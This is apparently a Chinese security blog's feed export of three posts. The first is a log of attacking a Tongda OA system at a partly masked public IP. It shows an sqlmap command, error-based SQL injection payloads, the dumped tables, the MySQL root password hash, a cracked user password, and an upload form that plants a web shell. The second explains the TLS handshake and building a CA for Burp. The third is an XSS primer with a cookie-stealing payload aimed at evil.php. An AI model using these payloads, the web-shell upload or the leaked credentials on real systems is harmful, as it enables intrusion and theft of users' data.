|</div><div class="line">| PIC_ID           | int(10) unsigned |</div><div class="line">| POST_DEPT        | text             |</div><div class="line">| POST_NO_HOME     | varchar(50)      |</div><div class="line">| POST_PRIV        | varchar(50)      |</div><div class="line">| REMARK           | text             |</div><div class="line">| SCORE            | int(11)          |</div><div class="line">| SECURE_KEY_SN    | varchar(20)      |</div><div class="line">| SEX              | char(1)          |</div><div class="line">| SHORTCUT         | text             |</div><div class="line">| SHOW_RSS         | char(1)          |</div><div class="line">| SMS_ON           | char(1)          |</div><div class="line">| TDER_FLAG        | char(1)          |</div><div class="line">| TEL_NO_DEPT      | varchar(50)      |</div><div class="line">| TEL_NO_HOME      | varchar(50)      |</div><div class="line">| THEME            | varchar(10)      |</div><div class="line">| UID              | int(11)          |</div><div class="line">| UIN              | int(10) unsigned |</div><div class="line">| USEING_KEY       | char(2)          |</div><div class="line">| USER_DEFINE      | text             |</div><div class="line">| USER_ID          | varchar(20)      |</div><div class="line">| USER_NAME        | varchar(200)     |</div><div class="line">| USER_NO          | int(11)          |</div><div class="line">| USER_PRIV        | varchar(10)      |</div><div class="line">| USER_PRIV_OTHER  | text             |</div><div class="line">| WEATHER_CITY     | varchar(20)      |</div><div class="line">| WEBMAIL_CAPACITY | int(11)          |</div><div class="line">| WEBMAIL_NUM      | int(11)          |</div><div class="line">+------------------+------------------+</div><div class="line"></div><div class="line"></div><div class="line">| version                               |</div><div class="line">| address                               |</div><div class="line">| address_group                         |</div><div class="line">| affair                                |</div><div class="line">| app_config                            |</div><div class="line">| app_log                               |</div><div class="line">| attachment_edit                       |</div><div class="line">| attend_config                         |</div><div class="line">| attend_duty                           |</div><div class="line">| attend_evection                       |</div><div class="line">| attend_holiday                        |</div><div class="line">| attend_leave                          |</div><div class="line">| attend_manager                        |</div><div class="line">| attend_out                            |</div><div class="line">| bbs_board                             |</div><div class="line">| bbs_comment                           |</div><div class="line">| book_info                             |</div><div class="line">| book_manage                           |</div><div class="line">| book_manager                          |</div><div class="line">| book_type                             |</div><div class="line">| bs_line                               |</div><div class="line">| calendar                              |</div><div class="line">| categories_type                       |</div><div class="line">| censor_data                           |</div><div class="line">| censor_module                         |</div><div class="line">| censor_words                          |</div><div class="line">| chatroom                              |</div><div class="line">| contact                               |</div><div class="line">| contract                              |</div><div class="line">| contract_line                         |</div><div class="line">| countdown                             |</div><div class="line">| cp_asset_type                         |</div><div class="line">| cp_assetcfg                           |</div><div class="line">| cp_cptl_info                          |</div><div class="line">| cp_dpct_sub                           |</div><div class="line">| cp_prcs_prop                          |</div><div class="line">| customer                              |</div><div class="line">| department                            |</div><div class="line">| dept_map                              |</div><div class="line">| diary                                 |</div><div class="line">| diary_comment                         |</div><div class="line">| diary_comment_reply                   |</div><div class="line">| efax_account                          |</div><div class="line">| efax_receive_box                      |</div><div class="line">| efax_send_box                         |</div><div class="line">| email                                 |</div><div class="line">| email_body                            |</div><div class="line">| email_box                             |</div><div class="line">| exam_data                             |</div><div class="line">| exam_flow                             |</div><div class="line">| exam_paper                            |</div><div class="line">| exam_quiz                             |</div><div class="line">| exam_quiz_set                         |</div><div class="line">| ext_user                              |</div><div class="line">| field_date                            |</div><div class="line">| fieldsetting                          |</div><div class="line">| file_content                          | //？</div><div class="line">| file_sort                             |</div><div class="line">| flow_form_type                        |</div><div class="line">| flow_print_tpl                        |</div><div class="line">| flow_process                          |</div><div class="line">| flow_query_tpl                        |</div><div class="line">| flow_rule                             |</div><div class="line">| flow_run                              |</div><div class="line">| flow_run_data                         |</div><div class="line">| flow_run_feedback                     |</div><div class="line">| flow_run_log                          |</div><div class="line">| flow_run_prcs                         |</div><div class="line">| flow_sort                             |</div><div class="line">| flow_timer                            |</div><div class="line">| flow_type                             |</div><div class="line">| hrms                                  |</div><div class="line">| icqcontact_tb                         |</div><div class="line">| icqmsgs_tb                            |</div><div class="line">| icqservermsg_tb                       |</div><div class="line">| interface                             |</div><div class="line">| ip_rule                               |</div><div class="line">| linkman                               |</div><div class="line">| meeting                               |</div><div class="line">| meeting_equipment                     |</div><div class="line">| meeting_room                          |</div><div class="line">| module_priv                           |</div><div class="line">| mytable                               |</div><div class="line">| netchat                               |</div><div class="line">| netdisk                               |</div><div class="line">| netmeeting                            |</div><div class="line">| news                                  |</div><div class="line">| news_comment                          |</div><div class="line">| notes                                 |</div><div class="line">| notify                                |</div><div class="line">| oa_faxassign                          |</div><div class="line">| oa_faxbatch                           |</div><div class="line">| oa_faxconfig                          |</div><div class="line">| oa_faxfeecharge                       |</div><div class="line">| oa_faxfeeline                         |</div><div class="line">| oa_faxfeeprice                        |</div><div class="line">| oa_faxlog                             |</div><div class="line">| oa_faxremotehost                      |</div><div class="line">| oa_faxs                               |</div><div class="line">| oa_faxserverconfig                    |</div><div class="line">| oa_faxspecline                        |</div><div class="line">| oa_faxtemplates                       |</div><div class="line">| oa_options                            |</div><div class="line">| oa_source                             |</div><div class="line">| oa_source_used                        |</div><div class="line">| oa_stamps                             |</div><div class="line">| oc_log                                |</div><div class="line">| office_products                       |</div><div class="line">| office_task                           |</div><div class="line">| office_transhistory                   |</div><div class="line">| order_line                            |</div><div class="line">| picture                               |</div><div class="line">| plan_type                             |</div><div class="line">| product                               |</div><div class="line">| proj_bug                              |</div><div class="line">| proj_comment                          |</div><div class="line">| proj_cost                             |</div><div class="line">| proj_file                             |</div><div class="line">| proj_file_log                         |</div><div class="line">| proj_file_sort                        |</div><div class="line">| proj_forum                            |</div><div class="line">| proj_priv                             |</div><div class="line">| proj_project                          |</div><div class="line">| proj_task                             |</div><div class="line">| proj_task_log                         |</div><div class="line">| provider                              |</div><div class="line">| provider_linkman                      |</div><div class="line">| rms_file                              |</div><div class="line">| rms_lend                              |</div><div class="line">| rms_roll                              |</div><div class="line">| rms_roll_room                         |</div><div class="line">| rsa_keypair                           |</div><div class="line">| sal_data                              |</div><div class="line">| sal_flow                              |</div><div class="line">| sal_item                              |</div><div class="line">| sale_history                          |</div><div class="line">| sale_manager                          |</div><div class="line">| score_date                            |</div><div class="line">| score_flow                            |</div><div class="line">| score_group                           |</div><div class="line">| score_item                            |</div><div class="line">| seal                                  |</div><div class="line">| seal_keylic                           |</div><div class="line">| seal_log                              |</div><div class="line">| secure_key                            |</div><div class="line">| service                               |</div><div class="line">| sms                                   |</div><div class="line">| sms2                                  |</div><div class="line">| sms2_priv                             |</div><div class="line">| sms3                                  |</div><div class="line">| sms_body                              |</div><div class="line">| supply_history                        |</div><div class="line">| supply_order                          |</div><div class="line">| sys_code                              |</div><div class="line">| sys_function                          |</div><div class="line">| sys_log                               |</div><div class="line">| sys_menu                              |</div><div class="line">| sys_para                              |</div><div class="line">| task                                  |</div><div class="line">| train_apply                           |</div><div class="line">| train_appoint_muster                  |</div><div class="line">| train_assess_data                     |</div><div class="line">| train_assess_item                     |</div><div class="line">| train_assess_title                    |</div><div class="line">| train_courses                         |</div><div class="line">| train_ctype                           |</div><div class="line">| train_info                            |</div><div class="line">| train_mail                            |</div><div class="line">| train_manager                         |</div><div class="line">| train_newcourse                       |</div><div class="line">| train_survey_data                     |</div><div class="line">| train_survey_item                     |</div><div class="line">| train_survey_title                    |</div><div class="line">| train_teachers                        |</div><div class="line">| train_ttype                           |</div><div class="line">| uni1                                  |</div><div class="line">| unit                                  |</div><div class="line">| url                                   |</div><div class="line">| user_group                            |</div><div class="line">| user_map                              |</div><div class="line">| user_online                           |</div><div class="line">| user_priv                             |</div><div class="line">| vehicle                               |</div><div class="line">| vehicle_maintenance                   |</div><div class="line">| vehicle_operator                      |</div><div class="line">| vehicle_usage                         |</div><div class="line">| versio1                               |</div><div class="line">| vi_flow_run                           |</div><div class="line">| vi_user                               |</div><div class="line">| vote_data                             |</div><div class="line">| vote_item                             |</div><div class="line">| vote_title                            |</div><div class="line">| webmail                               |</div><div class="line">| wiki_ask                              |</div><div class="line">| wiki_ask_answer                       |</div><div class="line">| wiki_comment                          |</div><div class="line">| wiki_info                             |</div><div class="line">| winexe                                |</div><div class="line">| word_model                            |</div><div class="line">| work_detail                           |</div><div class="line">| work_person                           |</div><div class="line">| work_plan                             |</div><div class="line">| zl_file                               |</div><div class="line">+---------------------------------------+</div></pre></td></tr></table></figure>
<p>python sqlmap.py -u “<a href="http://211.137.*.*/logincheck.php" target="_blank" rel="external">http://211.137.*.*/logincheck.php</a>“ –data=”PASSWORD=123456&amp;UNAME=admin%bf’*%23” -D TRAIN -T pass –columns</p>
<p>判断列字段个数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin?' AND (<span class="keyword">SELECT</span> <span class="number">5821</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x7171717071</span>,(<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name=<span class="number">0x70617373</span> <span class="keyword">AND</span> table_schema=<span class="number">0x545241494e</span>),<span class="number">0x717a767071</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)#</div></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">admin?' AND (<span class="keyword">SELECT</span> <span class="number">5821</span> <span class="keyword">FROM</span>(</div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(qqqpq,<span class="comment">/*concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL*/</span></div><div class="line">(<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name=<span class="string">'pass'</span> <span class="keyword">AND</span> table_schema=<span class="string">'TRAIN'</span>), <span class="comment">/*,获取列个数，如果没有就返回空NULL*/</span></div><div class="line">qzvpq,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="comment">/*floor：函数只返回整数部分，小数部分舍弃*/</span></div><div class="line"><span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x) <span class="keyword">as</span> a<span class="comment">/*这句话的意思是说每个派生出来的表（a）都必须有一个自己的别名*/</span>)#</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">MySQL 的CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：</span></div><div class="line"><span class="comment">	CAST(value as type);</span></div><div class="line"><span class="comment">	CONVERT(value, type);</span></div><div class="line"><span class="comment">就是CAST(xxx AS 类型), CONVERT(xxx,类型)。</span></div><div class="line"><span class="comment">*/</span></div></pre></td></tr></table></figure>
<p>爆列名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">admin?' AND (<span class="keyword">SELECT</span> <span class="number">4909</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),</div><div class="line"><span class="keyword">CONCAT</span>(<span class="number">0x7171717071</span>,</div><div class="line">(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(column_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> table_name=<span class="number">0x70617373</span> <span class="keyword">AND</span> table_schema=<span class="number">0x545241494e</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="comment">/*column_name列名，返回不止一个，用limit限制*/</span></div><div class="line"><span class="number">0x717a767071</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x </div><div class="line"><span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)#</div><div class="line"><span class="comment">/*SQL MID() 函数用于得到一个字符串的一部分。这个函数被MySQL支持，但不被MS SQL Server和Oracle支持。在SQL Server， Oracle 数据库中，我们可以使用 SQL SUBSTRING函数或者 SQL SUBSTR函数作为替代。*/</span></div><div class="line"><span class="keyword">SELECT</span> <span class="keyword">MID</span>(ColumnName, <span class="keyword">Start</span> [, <span class="keyword">Length</span>])</div><div class="line"><span class="keyword">FROM</span> TableName</div></pre></td></tr></table></figure></p>
<p>–password 当前用户密码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">admin?' AND (<span class="keyword">SELECT</span> <span class="number">7241</span> <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="number">0x7171717071</span>,(<span class="keyword">SELECT</span> <span class="keyword">MID</span>((<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">password</span> <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)),<span class="number">1</span>,<span class="number">50</span>) <span class="keyword">FROM</span> mysql.user <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x717a767071</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.CHARACTER_SETS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)#</div></pre></td></tr></table></figure></p>
<p>current user:    ‘root@127.0.0.1’<br>*91AF99F23C3D4ED85140D100433725DFA52BECEE</p>
<p>注入出的用户密码<br>张*   $1$772.CR0.$dlecp6h5kiOsrVX6Id2BY1 ==&gt; md5(unix) 594188</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> ---------------------------------------------------------------------------------------</div><div class="line">|                           TIPS                                                        |</div><div class="line">|Intermittent &apos;duplicate entry&apos; for key &apos;group_key&apos; on FLOOR(RAND())                    |</div><div class="line">|                                                                                       |</div><div class="line">|Description:                                                                           | </div><div class="line">|This is similar to Bug#31349, but lives outside inet_aton().                           |</div><div class="line">|It is quite odd - sometimes it returns proper resultset, sometimes it does not.        |</div><div class="line">|                                                                                       |</div><div class="line">|How to repeat:                                                                         |</div><div class="line">|create table grouptest1(a int);                                                        |</div><div class="line">|insert into grouptest1 values (0),(0),(0),(0),(0),(0),(0),(0),(0);                     |</div><div class="line">|select count(*),floor(rand()*2) x from grouptest1 group by x;                          |</div><div class="line">|                                                                                       |</div><div class="line">|mysql&gt; select count(*),floor(rand()*2) x from grouptest1 group by x;                   |</div><div class="line">|ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos;                            |</div><div class="line">|mysql&gt; select count(*),floor(rand()*2) x from grouptest1 group by x;                   |</div><div class="line">|ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos;                            |</div><div class="line">|mysql&gt; select count(*),floor(rand()*2) x from grouptest1 group by x;                   |</div><div class="line">|+----------+---+</div><div class="line">|| count(*) | x |</div><div class="line">|+----------+---+</div><div class="line">||        4 | 0 | </div><div class="line">||        5 | 1 | </div><div class="line">|+----------+---+</div><div class="line">|2 rows in set (0.01 sec)</div><div class="line">|</div><div class="line">|Suggested fix:</div><div class="line">|-</div><div class="line">|</div><div class="line"> ---------------------------------------------------------------------------------------</div></pre></td></tr></table></figure>
<h4 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h4><p>通达OA后台getshell<br><a href="http://www.doc88.com/p-1334628630199.html" target="_blank" rel="external">http://www.doc88.com/p-1334628630199.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"frmUpload"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span></span></div><div class="line"><span class="tag"><span class="attr">action</span>=<span class="string">"http://211.137.*.*/general/vmeet/privateUpload.php?fileName=555.php+"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></div><div class="line">Upload a new file:<span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"Filedata"</span> <span class="attr">size</span>=<span class="string">"50"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Upload"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">!–</span> <span class="attr">http:</span>//<span class="attr">192.168.56.139</span>/<span class="attr">general</span>/<span class="attr">vmeet</span>/<span class="attr">upload</span>/<span class="attr">temp</span>/<span class="attr">555.php.111</span> 这里是上传之后的网马–&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div></pre></td></tr></table></figure>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SSL协议]]></title>
      <url>/2015/04/08/SSL/</url>
      <content type="html"><![CDATA[<p>SSL (Secure Socket Layer)安全套接字层协议<br>    TLS (Transport Layer Security)传输层安全协议</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/keyless-comic-v1.gif" alt=""></p>
<p>第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。<br>第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。<br>第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。<br>第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。<br>第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成”对话密钥”（session key），用来加密接下来的整个对话过程。</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_rsa.jpg" alt=""></p>
<p>Tip:<br>1，生成对话密钥一共需要三个随机数，第三个发出的随机数是用服务端公钥加密的，除了客户端知道和服务端能解密出来外其他人不知道。<br>2，握手之后的对话使用”对话密钥”加密（对称加密），服务器的公钥和私钥只用于加密和解密”premaster secret”（非对称加密），无其他作用。<br>3，服务器公钥放在服务器的数字证书之中。</p>
<p>Diffie-Hellman</p>
<p><img src="https://blog.cloudflare.com/content/images/2014/Sep/ssl_handshake_diffie_hellman.jpg" alt=""></p>
<p>curl -k <a href="https://www.baidu.com/img/baidu_jgylogo3.gif" target="_blank" rel="external">https://www.baidu.com/img/baidu_jgylogo3.gif</a></p>
<p>Wireshark</p>
<p>192.168.1.5    180.97.33.107 SSL Client Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Server Hello<br>180.97.33.107    192.168.1.5    TLSv1.2        Certificate, Server Key Exchange（服务端DH参数）, Server Hello Done<br>192.168.1.5    180.97.33.107    TLSv1.2     Client Key Exchange（客户端DH参数）, Change Cipher Spec, Encrypted Handshake Message<br>180.97.33.107    192.168.1.5    TLSv1.2        Change Cipher Spec, Encrypted Handshake Message</p>
<p>Curl -v 显示交互过程</p>
<p>* TLSv1.2 (OUT), TLS handshake, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Server hello (2):<br>* NPN, negotiated HTTP1.1<br>* TLSv1.2 (IN), TLS handshake, Certificate (11):<br>* TLSv1.2 (IN), TLS handshake, Server key exchange (12):<br>* TLSv1.2 (IN), TLS handshake, Server finished (14):<br>* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):<br>* TLSv1.2 (OUT), TLS change cipher, Client hello (1):<br>* TLSv1.2 (OUT), TLS handshake, Unknown (67):<br>* TLSv1.2 (OUT), TLS handshake, Finished (20):<br>* TLSv1.2 (IN), TLS change cipher, Client hello (1):<br>* TLSv1.2 (IN), TLS handshake, Finished (20):<br>* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256</p>
<a id="more"></a>
<h3 id="证书生成"><a href="#证书生成" class="headerlink" title="证书生成"></a>证书生成</h3><p>1，自签名证书</p>
<p>生成私钥<br><code>openssl genrsa -des3 -out server.key 4096</code></p>
<p>去除key口令<br><code>openssl rsa -in server.key -out server.key</code></p>
<p>生成CSR<br><code>openssl req -new -key server.key -out server.csr -config openssl.cfg -subj &quot;/C=CN/ST=SC/L=CD/O=CerTest/OU=CerTest/CN=mm.ru0.pw&quot;</code></p>
<p>CN = baidu.com 通用名称<br>O = BeiJing Baidu Netcom Science Technology Co., Ltd 组织单位<br>OU = service operation department. 组织<br>L = beijing 城市<br>S = beijing 省/州名<br>C = CN 国家/地区</p>
<p>生成自签名证书<br><code>openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt</code></p>
<blockquote>
<p>openssl 生成私钥，通过私钥生成csr。权威证书机构通过这两个文件给你生成cer证书文件。但自建CA可为自己的请求签发证书，当然这是不可信的。当将CA导入“受信任的根证书颁发机构”后CA便认为该证书是可信的了。burp：8080的证书导入系统后相当于自己信任了自己。</p>
</blockquote>
<p>2，自建CA签发证书</p>
<p>Step1:生成根CA</p>
<p>生成随机数<br><code>openssl rand -out private/.rand 1000</code></p>
<p>生成私钥<br><code>openssl genrsa -aes256 -out cakey.pem 4096</code></p>
<p>生成CSR<br><code>openssl req -new -key cakey.pem -out ca.csr -subj &quot;/C=CN/ST=SC/O=CerTest/OU=Test Certificate Authority/CN=Test Root CA&quot; -config openssl.cfg</code></p>
<p>自签发根证书v3<br><code>openssl x509 -req -days 365 -sha256 -extfile openssl.cfg -extensions v3_ca -signkey cakey.pem -in ca.csr -out ca.crt</code></p>
<p>Step2:生成服务端证书<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -aes256 -out server-key.pem 2048</div><div class="line">openssl req -new -key server-key.pem -out server.csr -subj "/O=CerTest/OU=Test Certificate Authority/CN=*.baidu.com" -config openssl.cfg</div></pre></td></tr></table></figure></p>
<p>Step3:签发证书<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">openssl x509 -req -days 365 -sha256 -extfile openssl.cfg -extensions v3_req -CA ca.crt -CAkey cakey.pem -CAserial ca.srl -CAcreateserial -in server.csr -out server.crt</div></pre></td></tr></table></figure></p>
<p>？<br>openssl ca -in server.csr -out server.crt -cert ca.crt -keyfile cakey.pem -extfile openssl.cfg -extensions v3_req</p>
<p>转换成PKCS12格式供Burp使用<br><code>openssl pkcs12 -export -inkey server-key.pem -in server.crt -out server.pfx</code></p>
<p><img src="http://i.imgur.com/RdLCQVe.png" alt=""></p>
<p>将CA导入受信任的根证书颁发机构后若火狐仍不信任则在火狐证书管理器中对其编辑信任。</p>
<p><img src="http://i.imgur.com/A3FSl0q.png" alt=""></p>
<p>Chrome https代理死活出错解决办法</p>
<p>Chrome -&gt; Fiddler -&gt; Burp</p>
<p>配置Fiddler Gateway指向Burp</p>
<p>Manual Proxy Configuration:<br><a href="http://127.0.01:8080" target="_blank" rel="external">http://127.0.01:8080</a></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[XSS]]></title>
      <url>/2015/04/08/XSS/</url>
      <content type="html"><![CDATA[<h1 id="Cross-site-Scripting-XSS-跨站脚本"><a href="#Cross-site-Scripting-XSS-跨站脚本" class="headerlink" title="Cross-site Scripting (XSS) 跨站脚本"></a>Cross-site Scripting (XSS) 跨站脚本</h1><p>恶意代码注入</p>
<h4 id="XSS-using-Script-in-Attributes"><a href="#XSS-using-Script-in-Attributes" class="headerlink" title="XSS using Script in Attributes"></a>XSS using Script in Attributes</h4><p>XSS attacks may be conducted without using <script></script> tags. Other tags will do exactly the same thing, for example:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span></div></pre></td></tr></table></figure></p>
<p>or other attributes like: onmouseover, onerror.<br>onmouseover<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>onerror<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="XSS-using-Script-Via-Encoded-URI-Schemes"><a href="#XSS-using-Script-Via-Encoded-URI-Schemes" class="headerlink" title="XSS using Script Via Encoded URI Schemes"></a>XSS using Script Via Encoded URI Schemes</h4><p>使用编码绕过过滤 如:a=&amp;#X41 (UTF-8)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">j&amp;#X41vascript:alert(</span>'<span class="attr">test2</span>')&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="XSS-using-code-encoding"><a href="#XSS-using-code-encoding" class="headerlink" title="XSS using code encoding"></a>XSS using code encoding</h4><p>We may encode our script in base64 and place it in META tag.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>伪协议<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>获取用户cookies</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var adr = '../evil.php?cakemonster=' + escape(document.cookie);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></div></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>隐蔽性高</p>
<h2 id="DOM（Document-Object-Model）-XSS"><a href="#DOM（Document-Object-Model）-XSS" class="headerlink" title="DOM（Document Object Model） XSS"></a>DOM（Document Object Model） XSS</h2><p>动态修改html页面</p>
